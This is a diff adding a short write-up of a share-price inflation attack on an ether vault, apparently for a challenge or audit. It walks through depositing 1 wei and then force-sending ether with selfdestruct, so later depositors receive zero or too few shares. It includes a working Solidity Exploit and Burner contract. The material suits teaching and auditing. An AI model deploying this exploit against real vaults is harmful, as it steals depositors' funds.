@@ -1,0 +1,35 @@
+This is the classic share-price inflation attack. The vault prices shares on its raw ether balance, and anyone can force-send ether to it.
+
+1. The attacker deposits 1 wei and receives 1 share, so `totalShares` is 1.
+2. The attacker force-sends the remaining ether via `selfdestruct`, since the vault has no `receive`. The balance is now about 1 ether, still against 1 share.
+3. A deposits 2 ether and gets `2e18 * 1 / (1e18 + 1)`, which floors to 1 share.
+4. B deposits 0.5 ether and gets `0.5e18 * 2 / (3e18 + 1)`, which floors to 0 shares.
+5. B receives nothing, and A redeems for only about 1.75 ether of the 2 deposited. Both fall below the 99% threshold.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+interface IVault {
+    function deposit() external payable returns (uint256);
+}
+
+contract Burner {
+    constructor(address payable to) payable {
+        selfdestruct(to);
+    }
+}
+
+contract Exploit {
+    address public target;
+
+    constructor(address _target) payable {
+        target = _target;
+    }
+
+    function run() external {
+        IVault(target).deposit{value: 1}();
+        new Burner{value: address(this).balance}(payable(target));
+    }
+}
+```
